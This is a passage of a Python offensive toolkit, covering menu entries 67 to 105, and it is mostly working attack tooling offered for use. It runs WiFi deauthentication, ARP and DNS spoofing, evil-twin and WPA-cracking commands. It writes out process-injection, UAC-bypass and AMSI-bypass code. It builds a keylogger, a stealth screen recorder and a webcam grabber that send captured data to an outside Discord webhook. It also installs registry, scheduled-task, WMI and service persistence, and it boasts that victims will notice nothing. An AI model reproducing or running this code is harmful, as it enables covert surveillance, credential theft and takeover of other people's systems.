    print(f"   - 2FA tokens may be captured before use")
    print(f"   - All data sent to your Discord webhook")
    print(f"   - Victim will NOT see any suspicious activity")
    
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_67():
    banner()
    print(f"{RED}{BOLD}[67] WiFi Deauth Attack{RESET}\n")
    print(f"{CYAN}[*] Sends deauthentication packets to disconnect WiFi clients{RESET}\n")
    interface = input(f"{RED}[?] WiFi interface (monitor mode, e.g., wlan0mon): {RESET}")
    bssid = input(f"{RED}[?] Target AP BSSID (e.g., AA:BB:CC:DD:EE:FF): {RESET}")
    client = input(f"{RED}[?] Client MAC (leave blank for broadcast): {RESET}")
    packets = input(f"{RED}[?] Number of packets (0 for infinite): {RESET}") or "0"
    
    if client:
        cmd = f"sudo aireplay-ng -0 {packets} -a {bssid} -c {client} {interface}"
    else:
        cmd = f"sudo aireplay-ng -0 {packets} -a {bssid} {interface}"
    
    print(f"\n{YELLOW}[!] Running: {cmd}{RESET}")
    print(f"{YELLOW}[!] Requires aircrack-ng and monitor mode enabled{RESET}")
    input(f"\n{RED}[?] Press Enter to execute (if tools installed){RESET}")

def tool_68():
    banner()
    print(f"{RED}{BOLD}[68] ARP Poison MITM{RESET}\n")
    print(f"{CYAN}[*] ARP spoofing to intercept network traffic between target and gateway{RESET}\n")
    target_ip = input(f"{RED}[?] Target IP address: {RESET}")
    gateway_ip = input(f"{RED}[?] Gateway IP address: {RESET}")
    interface = input(f"{RED}[?] Network interface: {RESET}")
    
    print(f"\n{YELLOW}[!] Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward{RESET}")
    print(f"{YELLOW}[!] Run: arpspoof -i {interface} -t {target_ip} {gateway_ip}{RESET}")
    print(f"{YELLOW}[!] Run second terminal: arpspoof -i {interface} -t {gateway_ip} {target_ip}{RESET}")
    input(f"\n{RED}[?] Press Enter after setup{RESET}")

def tool_69():
    banner()
    print(f"{RED}{BOLD}[69] DNS Spoof Server{RESET}\n")
    print(f"{CYAN}[*] Creates fake DNS responses to redirect domains to malicious IP{RESET}\n")
    
    hosts_file = input(f"{RED}[?] Path to hosts file (format: IP domain): {RESET}")
    if not hosts_file:
        hosts_file = "dns_hosts.txt"
        with open(hosts_file, 'w') as f:
            f.write("# Format: 192.168.1.100 facebook.com\n")
            f.write("# Example: 10.0.0.1 google.com\n")
        print(f"{GREEN}[+] Created example hosts file: {hosts_file}{RESET}")
    
    interface = input(f"{RED}[?] Network interface (default eth0): {RESET}") or "eth0"
    
    print(f"\n{YELLOW}[!] Run: dnsspoof -i {interface} -f {hosts_file}{RESET}")
    print(f"{YELLOW}[!] Requires dsniff package{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_70():
    banner()
    print(f"{RED}{BOLD}[70] MAC Flooder (CAM Table Overflow){RESET}\n")
    print(f"{CYAN}[*] Floods switch CAM table with random MAC addresses{RESET}\n")
    interface = input(f"{RED}[?] Network interface: {RESET}")
    speed = input(f"{RED}[?] Packets per second (default 1000): {RESET}") or "1000"
    
    print(f"\n{YELLOW}[!] Run: macof -i {interface} -s {speed}{RESET}")
    print(f"{YELLOW}[!] Requires dsniff package{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_71():
    banner()
    print(f"{RED}{BOLD}[71] Evil Twin Access Point{RESET}\n")
    print(f"{CYAN}[*] Creates a fake AP to steal credentials{RESET}\n")
    ssid = input(f"{RED}[?] SSID to clone: {RESET}")
    interface = input(f"{RED}[?] WiFi interface (monitor mode): {RESET}")
    channel = input(f"{RED}[?] Channel (default 6): {RESET}") or "6"
    
    print(f"\n{YELLOW}[!] Run: airbase-ng -e \"{ssid}\" -c {channel} {interface}{RESET}")
    print(f"{YELLOW}[!] Then start DHCP: dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_72():
    banner()
    print(f"{RED}{BOLD}[72] PMKID Capture{RESET}\n")
    print(f"{CYAN}[*] Captures PMKID from WPA/WPA2 networks for offline cracking{RESET}\n")
    interface = input(f"{RED}[?] WiFi interface (monitor mode): {RESET}")
    
    print(f"\n{YELLOW}[!] Run: hcxdumptool -i {interface} --enable_status=1 -o capture.pcapng{RESET}")
    print(f"{YELLOW}[!] Convert: hcxpcapngtool -o hash.hccapx capture.pcapng{RESET}")
    print(f"{YELLOW}[!] Crack: hashcat -m 16800 hash.hccapx wordlist.txt{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_73():
    banner()
    print(f"{RED}{BOLD}[73] Handshake Capturer{RESET}\n")
    print(f"{CYAN}[*] Captures WPA 4-way handshake for password cracking{RESET}\n")
    interface = input(f"{RED}[?] WiFi interface (monitor mode): {RESET}")
    bssid = input(f"{RED}[?] Target BSSID: {RESET}")
    channel = input(f"{RED}[?] Channel: {RESET}")
    
    print(f"\n{YELLOW}[!] Run: airodump-ng -c {channel} --bssid {bssid} -w capture {interface}{RESET}")
    print(f"{YELLOW}[!] In another terminal: aireplay-ng -0 5 -a {bssid} {interface}{RESET}")
    print(f"{YELLOW}[!] Crack: aircrack-ng -w wordlist.txt capture-01.cap{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_74():
    banner()
    print(f"{RED}{BOLD}[74] WPA/WPA2 Cracker (Bruteforce){RESET}\n")
    print(f"{CYAN}[*] Cracks WPA/WPA2 handshake using wordlist{RESET}\n")
    handshake = input(f"{RED}[?] Path to .cap handshake file: {RESET}")
    wordlist = input(f"{RED}[?] Path to wordlist (default rockyou.txt): {RESET}") or "rockyou.txt"
    
    if not os.path.exists(wordlist):
        print(f"{YELLOW}[!] Wordlist not found. Downloading rockyou.txt...{RESET}")
        os.system(f"wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O {wordlist} 2>/dev/null")
    
    print(f"\n{YELLOW}[!] Running: aircrack-ng -w {wordlist} {handshake}{RESET}")
    input(f"\n{RED}[?] Press Enter to crack (may take hours){RESET}")

def tool_75():
    banner()
    print(f"{RED}{BOLD}[75] Bluetooth Scanner{RESET}\n")
    print(f"{CYAN}[*] Scans for nearby Bluetooth devices{RESET}\n")
    timeout = input(f"{RED}[?] Scan duration (seconds): {RESET}") or "10"
    
    print(f"\n{YELLOW}[!] Running: hcitool scan --timeout={timeout}{RESET}")
    os.system(f"hcitool scan --timeout={timeout}")
    
    print(f"\n{YELLOW}[!] Also try: bluetoothctl scan on{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_76():
    banner()
    print(f"{RED}{BOLD}[76] ARP Scanner (Network Discovery){RESET}\n")
    print(f"{CYAN}[*] Discovers all devices on local network using ARP{RESET}\n")
    subnet = input(f"{RED}[?] Subnet (e.g., 192.168.1.0/24): {RESET}") or "192.168.1.0/24"
    
    print(f"\n{YELLOW}[!] Running: nmap -sn {subnet}{RESET}")
    os.system(f"nmap -sn {subnet}")
    print(f"\n{YELLOW}[!] Alternative: arp-scan --local{RESET}")
    os.system("arp-scan --local 2>/dev/null || echo 'arp-scan not installed'")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_77():
    banner()
    print(f"{RED}{BOLD}[77] IPv6 Network Scanner{RESET}\n")
    print(f"{CYAN}[*] Discovers IPv6 devices on local network{RESET}\n")
    interface = input(f"{RED}[?] Network interface: {RESET}") or "eth0"
    
    print(f"\n{YELLOW}[!] Running: alive6 {interface}{RESET}")
    print(f"{YELLOW}[!] Requires sipcalc and ndisc6 tools{RESET}")
    os.system(f"alive6 {interface} 2>/dev/null || echo 'alive6 not found. Install: apt install sipcalc ndisc6'")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_78():
    banner()
    print(f"{RED}{BOLD}[78] UPnP Scanner{RESET}\n")
    print(f"{CYAN}[*] Discovers UPnP devices on network{RESET}\n")
    
    print(f"\n{YELLOW}[!] Running: upnpc -l{RESET}")
    os.system("upnpc -l 2>/dev/null || echo 'upnpc not installed. Install: apt install miniupnpc'")
    print(f"\n{YELLOW}[!] Alternative: nmap --script upnp-info --script-args upnp-info.target=192.168.1.1{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_79():
    banner()
    print(f"{RED}{BOLD}[79] SNMP Scanner{RESET}\n")
    print(f"{CYAN}[*] Scans for SNMP devices and enumerates communities{RESET}\n")
    target = input(f"{RED}[?] Target IP or range: {RESET}")
    
    print(f"\n{YELLOW}[!] Running: snmpwalk -v2c -c public {target}{RESET}")
    os.system(f"snmpwalk -v2c -c public {target} 2>/dev/null | head -20 || echo 'snmpwalk not found'")
    print(f"\n{YELLOW}[!] Community brute: onesixtyone {target} -c community.txt{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_80():
    banner()
    print(f"{RED}{BOLD}[80] NTP Scanner{RESET}\n")
    print(f"{CYAN}[*] Scans for NTP servers vulnerable to monlist{RESET}\n")
    target = input(f"{RED}[?] Target IP or range: {RESET}")
    
    print(f"\n{YELLOW}[!] Running: ntpdc -n -c monlist {target}{RESET}")
    os.system(f"ntpdc -n -c monlist {target} 2>/dev/null || echo 'ntpdc not found'")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_81():
    banner()
    print(f"{RED}{BOLD}[81] SMB Scanner (Windows Shares){RESET}\n")
    print(f"{CYAN}[*] Enumerates SMB shares and OS information{RESET}\n")
    target = input(f"{RED}[?] Target IP or range: {RESET}")
    
    print(f"\n{YELLOW}[!] Running: nmap --script smb-os-discovery,smb-enum-shares {target}{RESET}")
    os.system(f"nmap --script smb-os-discovery,smb-enum-shares {target} -p 445")
    print(f"\n{YELLOW}[!] Using smbclient: smbclient -L //{target}{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_82():
    banner()
    print(f"{RED}{BOLD}[82] LDAP Scanner{RESET}\n")
    print(f"{CYAN}[*] Enumerates LDAP directory services{RESET}\n")
    target = input(f"{RED}[?] Target IP: {RESET}")
    
    print(f"\n{YELLOW}[!] Running: nmap --script ldap-search -p 389 {target}{RESET}")
    os.system(f"nmap --script ldap-search -p 389 {target}")
    print(f"\n{YELLOW}[!] Manual: ldapsearch -x -H ldap://{target} -b 'dc=domain,dc=com'{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_83():
    banner()
    print(f"{RED}{BOLD}[83] SSH Scanner{RESET}\n")
    print(f"{CYAN}[*] Scans for SSH servers and grabs banners{RESET}\n")
    target = input(f"{RED}[?] Target IP or range: {RESET}")
    
    print(f"\n{YELLOW}[!] Running: nmap --script ssh2-enum-algos -p 22 {target}{RESET}")
    os.system(f"nmap --script ssh2-enum-algos -p 22 {target}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_84():
    banner()
    print(f"{RED}{BOLD}[84] FTP Scanner{RESET}\n")
    print(f"{CYAN}[*] Scans for FTP servers and checks anonymous access{RESET}\n")
    target = input(f"{RED}[?] Target IP or range: {RESET}")
    
    print(f"\n{YELLOW}[!] Running: nmap --script ftp-anon -p 21 {target}{RESET}")
    os.system(f"nmap --script ftp-anon -p 21 {target}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_85():
    banner()
    print(f"{RED}{BOLD}[85] RDP Scanner{RESET}\n")
    print(f"{CYAN}[*] Scans for RDP servers and checks security level{RESET}\n")
    target = input(f"{RED}[?] Target IP or range: {RESET}")
    
    print(f"\n{YELLOW}[!] Running: nmap --script rdp-enum-encryption -p 3389 {target}{RESET}")
    os.system(f"nmap --script rdp-enum-encryption -p 3389 {target}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_86():
    banner()
    print(f"{RED}{BOLD}[86] VNC Scanner{RESET}\n")
    print(f"{CYAN}[*] Scans for VNC servers and checks authentication{RESET}\n")
    target = input(f"{RED}[?] Target IP or range: {RESET}")
    
    print(f"\n{YELLOW}[!] Running: nmap --script vnc-info -p 5900 {target}{RESET}")
    os.system(f"nmap --script vnc-info -p 5900 {target}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_87():
    banner()
    print(f"{RED}{BOLD}[87] Telnet Scanner{RESET}\n")
    print(f"{CYAN}[*] Scans for Telnet services and checks default credentials{RESET}\n")
    target = input(f"{RED}[?] Target IP or range: {RESET}")
    
    print(f"\n{YELLOW}[!] Running: nmap --script telnet-brute -p 23 {target}{RESET}")
    os.system(f"nmap --script telnet-brute -p 23 {target}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_88():
    banner()
    print(f"{RED}{BOLD}[88] DNS Zone Transfer{RESET}\n")
    print(f"{CYAN}[*] Attempts DNS zone transfer (AXFR){RESET}\n")
    domain = input(f"{RED}[?] Domain name: {RESET}")
    dns_server = input(f"{RED}[?] DNS server (optional): {RESET}")
    
    if dns_server:
        cmd = f"dig axfr @{dns_server} {domain}"
    else:
        cmd = f"dig axfr {domain}"
    
    print(f"\n{YELLOW}[!] Running: {cmd}{RESET}")
    os.system(cmd)
    print(f"\n{YELLOW}[!] Alternative: dnsrecon -d {domain} -t axfr{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_89():
    banner()
    print(f"{RED}{BOLD}[89] Process Injector{RESET}\n")
    print(f"{CYAN}[*] Injects malicious DLL/shellcode into running process{RESET}\n")
    print(f"{RED}[1] DLL Injection{RESET}")
    print(f"{RED}[2] Shellcode Injection{RESET}")
    print(f"{RED}[3] Process Hollowing{RESET}")
    choice = input(f"{RED}[?] Select: {RESET}")
    pid = input(f"{RED}[?] Target Process ID: {RESET}")
    payload = input(f"{RED}[?] Path to DLL/shellcode file: {RESET}")
    
    python_code = f'''
import ctypes
import psutil
kernel32 = ctypes.windll.kernel32
process = kernel32.OpenProcess(0x1F0FFF, False, {pid})
alloc = kernel32.VirtualAllocEx(process, 0, len(open(r'{payload}','rb').read()), 0x3000, 0x40)
kernel32.WriteProcessMemory(process, alloc, open(r'{payload}','rb').read(), len(open(r'{payload}','rb').read()), 0)
kernel32.CreateRemoteThread(process, 0, 0, alloc, 0, 0, 0)
print("[+] Injected!")
'''
    with open(f"injector_{int(time.time())}.py", 'w') as f:
        f.write(python_code)
    print(f"{GREEN}[+] Injection script saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_90():
    banner()
    print(f"{RED}{BOLD}[90] DLL Sideloader{RESET}\n")
    print(f"{CYAN}[*] Finds vulnerable executables for DLL side-loading{RESET}\n")
    target_exe = input(f"{RED}[?] Path to target executable: {RESET}")
    malicious_dll = input(f"{RED}[?] Name of malicious DLL to create: {RESET}")
    
    dll_template = f'''#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        WinExec("calc.exe", SW_SHOW);
    }}
    return TRUE;
}}'''
    
    with open(f"{malicious_dll}.c", 'w') as f:
        f.write(dll_template)
    print(f"{GREEN}[+] DLL template saved. Compile with MinGW: x86_64-w64-mingw32-gcc -shared -o {malicious_dll}.dll {malicious_dll}.c{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_91():
    banner()
    print(f"{RED}{BOLD}[91] UAC Bypass Generator{RESET}\n")
    print(f"{CYAN}[*] Generates UAC bypass techniques{RESET}\n")
    payload = input(f"{RED}[?] Command to run as admin: {RESET}")
    
    print(f"\n{GREEN}[1] Fodhelper Bypass{RESET}")
    fodhelper = f'''reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{payload}" /f
reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 0 /f
fodhelper.exe
reg delete HKCU\\Software\\Classes\\ms-settings\\ /f'''
    
    print(f"\n{GREEN}[2] CMSTP Bypass{RESET}")
    cmstp = f'''echo {payload} > payload.bat
cmstp /ni /s payload.bat'''
    
    print(f"\n{GREEN}[3] SilentCleanup Bypass{RESET}")
    silent = f'''schtasks /run /tn "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup" /I
reg add HKCU\\Environment /v windir /d "cmd /c {payload} &" /f
schtasks /run /tn "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup" /I'''
    
    print(f"\n{GREEN}[4] EventViewer Bypass{RESET}")
    event = f'''reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "{payload}" /f
eventvwr.exe'''
    
    with open(f"uac_bypass_{int(time.time())}.bat", 'w') as f:
        f.write(fodhelper)
    print(f"{GREEN}[+] UAC bypass script saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_92():
    banner()
    print(f"{RED}{BOLD}[92] AMSI Bypass Generator{RESET}\n")
    print(f"{CYAN}[*] Generates AMSI bypass techniques for PowerShell{RESET}\n")
    
    bypasses = [
        "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)",
        "[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0)",
        "$a='System.Management.Automation.AmsiUtils'; [Ref].Assembly.GetType($a).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
    ]
    
    for i, bypass in enumerate(bypasses, 1):
        print(f"{GREEN}[{i}] {bypass[:80]}...{RESET}")
    
    with open(f"amsi_bypass_{int(time.time())}.ps1", 'w') as f:
        f.write(bypasses[0])
    print(f"{GREEN}[+] AMSI bypass saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_93():
    banner()
    print(f"{RED}{BOLD}[93] Rootkit Installer{RESET}\n")
    print(f"{CYAN}[*] Installs kernel-level rootkit for persistence{RESET}\n")
    print(f"{RED}[1] LD_PRELOAD (Linux){RESET}")
    print(f"{RED}[2] DKOM (Windows){RESET}")
    print(f"{RED}[3] Kernel Module (Linux){RESET}")
    choice = input(f"{RED}[?] Select: {RESET}")
    
    if choice == "1":
        print(f"\n{YELLOW}[!] Create /etc/ld.so.preload with malicious library path{RESET}")
        print(f"echo '/path/to/malicious.so' | sudo tee -a /etc/ld.so.preload")
    elif choice == "2":
        print(f"\n{YELLOW}[!] Windows DKOM rootkit requires driver compilation{RESET}")
        print(f"Use tools like: rootkit.com or WinRing0")
    elif choice == "3":
        print(f"\n{YELLOW}[!] Create kernel module: make -C /lib/modules/$(uname -r)/build M=$(pwd) modules{RESET}")
    
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_94():
    banner()
    print(f"{RED}{BOLD}[94] Persistence Kit{RESET}\n")
    print(f"{CYAN}[*] Installs persistence mechanisms{RESET}\n")
    payload_path = input(f"{RED}[?] Path to payload executable: {RESET}")
    
    print(f"\n{GREEN}[1] Registry Run Key (Windows){RESET}")
    print(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "{payload_path}" /f')
    
    print(f"\n{GREEN}[2] Scheduled Task (Windows){RESET}")
    print(f'schtasks /create /tn "Updater" /tr "{payload_path}" /sc daily /st 09:00 /f')
    
    print(f"\n{GREEN}[3] Startup Folder (Windows){RESET}")
    print(f'copy "{payload_path}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"')
    
    print(f"\n{GREEN}[4] Cron Job (Linux){RESET}")
    print(f'(crontab -l 2>/dev/null; echo "@reboot {payload_path}") | crontab -')
    
    print(f"\n{GREEN}[5] Systemd Service (Linux){RESET}")
    service = f'''[Unit]
Description=Updater Service
After=network.target

[Service]
ExecStart={payload_path}
Restart=always

[Install]
WantedBy=multi-user.target'''
    
    with open("persistence_service.service", 'w') as f:
        f.write(service)
    print(f"{GREEN}[+] Systemd service file saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_95():
    banner()
    print(f"{RED}{BOLD}[95] Keylogger Builder{RESET}\n")
    print(f"{CYAN}[*] Builds a stealth keylogger{RESET}\n")
    webhook = input(f"{RED}[?] Discord webhook for logs: {RESET}")
    
    keylogger_code = f'''import pynput.keyboard
import requests
import threading
import time

WEBHOOK = "{webhook}"
log = ""

def send_log():
    global log
    if log:
        try:
            requests.post(WEBHOOK, json={{"content": f"```\\\\n{{log}}\\\\n```"}}, timeout=5)
        except:
            pass
    log = ""
    threading.Timer(60, send_log).start()

def on_press(key):
    global log
    try:
        log += key.char
    except:
        log += f" [{{key}}] "

listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
send_log()
listener.join()
'''
    
    with open(f"keylogger_{int(time.time())}.py", 'w') as f:
        f.write(keylogger_code)
    print(f"{GREEN}[+] Keylogger saved. Build with: pyinstaller --onefile --noconsole keylogger_*.py{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_96():
    banner()
    print(f"{RED}{BOLD}[96] Screen Recorder (Stealth){RESET}\n")
    print(f"{CYAN}[*] Captures screen silently in background{RESET}\n")
    duration = input(f"{RED}[?] Recording duration (seconds): {RESET}") or "60"
    webhook = input(f"{RED}[?] Discord webhook for upload: {RESET}")
    
    recorder_code = f'''import cv2
import numpy as np
from PIL import ImageGrab
import requests
import time
import os

DURATION = {duration}
WEBHOOK = "{webhook}"

fps = 5
width, height = ImageGrab.grab().size
fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter(f'recording_{{time.time()}}.avi', fourcc, fps, (width, height))

for _ in range(DURATION * fps):
    img = ImageGrab.grab()
    frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
    out.write(frame)
    time.sleep(1/fps)

out.release()
with open(f'recording_{{int(time.time())}}.avi', 'rb') as f:
    requests.post(WEBHOOK, files={{'file': f}})
'''
    
    with open(f"screencap_{int(time.time())}.py", 'w') as f:
        f.write(recorder_code)
    print(f"{GREEN}[+] Screen recorder saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_97():
    banner()
    print(f"{RED}{BOLD}[97] Webcam Capture{ RESET}\n")
    print(f"{CYAN}[*] Captures webcam silently{RESET}\n")
    webhook = input(f"{RED}[?] Discord webhook for upload: {RESET}")
    
    webcam_code = f'''import cv2
import requests
import time

WEBHOOK = "{webhook}"

cap = cv2.VideoCapture(0)
ret, frame = cap.read()
if ret:
    path = f'webcam_{{time.time()}}.jpg'
    cv2.imwrite(path, frame)
    with open(path, 'rb') as f:
        requests.post(WEBHOOK, files={{'file': f}})
    cap.release()
'''
    
    with open(f"webcam_{int(time.time())}.py", 'w') as f:
        f.write(webcam_code)
    print(f"{GREEN}[+] Webcam capture saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_98():
    banner()
    print(f"{RED}{BOLD}[98] Registry Persistence{RESET}\n")
    print(f"{CYAN}[*] Adds persistence via Windows Registry{RESET}\n")
    payload = input(f"{RED}[?] Path to payload: {RESET}")
    key_name = input(f"{RED}[?] Registry key name (default: Updater): {RESET}") or "Updater"
    
    print(f"\n{YELLOW}[!] Adding to HKCU Run:{RESET}")
    print(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {key_name} /t REG_SZ /d "{payload}" /f')
    
    print(f"\n{YELLOW}[!] Adding to HKLM Run (requires admin):{RESET}")
    print(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {key_name} /t REG_SZ /d "{payload}" /f')
    
    print(f"\n{YELLOW}[!] Adding as Windows Service (requires admin):{RESET}")
    print(f'sc create {key_name} binPath= "{payload}" start= auto')
    
    input(f"\n{RED}[?] Press Enter to apply (run as admin if needed){RESET}")
    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {key_name} /t REG_SZ /d "{payload}" /f 2>/dev/null')
    print(f"{GREEN}[+] Registry entry added{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_99():
    banner()
    print(f"{RED}{BOLD}[99] Scheduled Task Persistence{RESET}\n")
    print(f"{CYAN}[*] Adds persistence via Windows Scheduled Tasks{RESET}\n")
    payload = input(f"{RED}[?] Path to payload: {RESET}")
    task_name = input(f"{RED}[?] Task name (default: SystemUpdater): {RESET}") or "SystemUpdater"
    
    print(f"\n{YELLOW}[!] Creating daily task:{RESET}")
    print(f'schtasks /create /tn "{task_name}" /tr "{payload}" /sc daily /st 09:00 /f')
    
    print(f"\n{YELLOW}[!] Creating task on logon:{RESET}")
    print(f'schtasks /create /tn "{task_name}" /tr "{payload}" /sc onlogon /f')
    
    print(f"\n{YELLOW}[!] Creating task every hour:{RESET}")
    print(f'schtasks /create /tn "{task_name}" /tr "{payload}" /sc hourly /mo 1 /f')
    
    input(f"\n{RED}[?] Press Enter to create task{RESET}")
    os.system(f'schtasks /create /tn "{task_name}" /tr "{payload}" /sc onlogon /f 2>/dev/null')
    print(f"{GREEN}[+] Scheduled task created{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_100():
    banner()
    print(f"{RED}{BOLD}[100] WMI Event Subscription{RESET}\n")
    print(f"{CYAN}[*] Creates WMI event filter for persistence{RESET}\n")
    payload = input(f"{RED}[?] PowerShell command to run: {RESET}")
    
    wmi_code = f'''$filterArgs = @{{Name='UpdaterFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $filterArgs

$consumerArgs = @{{Name='UpdaterConsumer'; CommandLineTemplate='powershell -Command "{payload}"'}}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $consumerArgs

$bindingArgs = @{{Filter=$filter; Consumer=$consumer}}
$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $bindingArgs
Write-Host "[+] WMI Persistence installed"'''
    
    with open(f"wmi_persistence_{int(time.time())}.ps1", 'w') as f:
        f.write(wmi_code)
    print(f"{GREEN}[+] WMI persistence script saved{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_101():
    banner()
    print(f"{RED}{BOLD}[101] Startup Folder Persistence{RESET}\n")
    print(f"{CYAN}[*] Copies payload to Windows Startup folder{RESET}\n")
    payload = input(f"{RED}[?] Path to payload: {RESET}")
    
    startup_paths = [
        os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
        os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    ]
    
    for path in startup_paths:
        if os.path.exists(path):
            dest = os.path.join(path, os.path.basename(payload))
            try:
                shutil.copy2(payload, dest)
                print(f"{GREEN}[+] Copied to {dest}{RESET}")
            except:
                print(f"{RED}[-] Failed to copy to {path}{RESET}")
    
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_102():
    banner()
    print(f"{RED}{BOLD}[102] Services Installation (Persistence){RESET}\n")
    print(f"{CYAN}[*] Installs payload as Windows service{RESET}\n")
    payload = input(f"{RED}[?] Path to .exe payload: {RESET}")
    service_name = input(f"{RED}[?] Service name (default: WindowsUpdateSvc): {RESET}") or "WindowsUpdateSvc"
    
    print(f"\n{YELLOW}[!] Creating service:{RESET}")
    print(f'sc create "{service_name}" binPath= "{payload}" start= auto')
    print(f'sc description "{service_name}" "Manages Windows updates"')
    print(f'sc start "{service_name}"')
    
    input(f"\n{RED}[?] Press Enter to create service (requires admin){RESET}")
    os.system(f'sc create "{service_name}" binPath= "{payload}" start= auto 2>/dev/null')
    print(f"{GREEN}[+] Service created{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_103():
    banner()
    print(f"{RED}{BOLD}[103] COM Hijacking{RESET}\n")
    print(f"{CYAN}[*] Hijacks COM objects for persistence{RESET}\n")
    clsid = input(f"{RED}[?] CLSID to hijack (e.g., 00024500-0000-0000-C000-000000000046): {RESET}")
    payload = input(f"{RED}[?] Path to malicious DLL: {RESET}")
    
    print(f"\n{YELLOW}[!] Adding COM hijack registry entries:{RESET}")
    print(f'reg add "HKCR\\{clsid}\\InprocServer32" /ve /t REG_SZ /d "{payload}" /f')
    print(f'reg add "HKCR\\{clsid}\\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f')
    
    input(f"\n{RED}[?] Press Enter to apply (requires admin){RESET}")
    print(f"{GREEN}[+] COM hijack configured{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_104():
    banner()
    print(f"{RED}{BOLD}[104] DLL Search Order Hijacking{RESET}\n")
    print(f"{CYAN}[*] Hijacks DLL search order for persistence{RESET}\n")
    vulnerable_exe = input(f"{RED}[?] Path to vulnerable executable: {RESET}")
    malicious_dll = input(f"{RED}[?] Name of DLL to hijack (e.g., version.dll): {RESET}")
    
    exe_dir = os.path.dirname(vulnerable_exe)
    if exe_dir:
        dll_path = os.path.join(exe_dir, malicious_dll)
        print(f"\n{YELLOW}[!] Place malicious DLL at: {dll_path}{RESET}")
        print(f"{YELLOW}[!] Executable will load your DLL automatically{RESET}")
    
    print(f"\n{GREEN}[+] Common hijackable DLLs: version.dll, winmm.dll, d3d9.dll, dwmapi.dll{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_105():
    banner()
    print(f"{RED}{BOLD}[105] Image File Execution Options{RESET}\n")
    print(f"{CYAN}[*] Hijacks executable execution via IFEO{RESET}\n")
    target_exe = input(f"{RED}[?] Target executable to hijack (e.g., sethc.exe): {RESET}")
    payload = input(f"{RED}[?] Payload to run instead: {RESET}")
